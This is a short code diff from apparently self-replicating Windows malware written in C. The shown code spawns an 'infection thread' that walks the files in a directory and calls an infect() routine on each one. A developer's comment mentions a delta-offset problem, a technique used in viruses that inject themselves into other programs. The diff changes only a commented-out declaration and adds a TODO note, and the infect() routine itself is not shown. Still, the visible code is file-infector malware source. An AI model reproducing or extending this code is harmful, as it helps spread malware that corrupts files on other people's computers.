@@ -17,8 +17,6 @@
 
 #include "poison.h"
 
-// static DWORD WINAPI infection_thread(LPVOID param);
-
 void spawn_infection_thread(void) {
     HANDLE thread = CREATE_THREAD(NULL, 0,
                                   (LPTHREAD_START_ROUTINE)BYTE_OFFSET(
@@ -48,6 +46,8 @@ DWORD WINAPI infection_thread(LPVOID param) {
     if (h_find != INVALID_HANDLE_VALUE) {
         do {
             PRINT_DEBUG("infecting %s", find_data.cFileName);
+            // TODO: BEWARE don't know why not adding delta offset to
+            // spawn_infection_thread addr?
             if (infect(find_data.cFileName, (void *)spawn_infection_thread) ==
                 0) {
                 PRINT_DEBUG("success!");
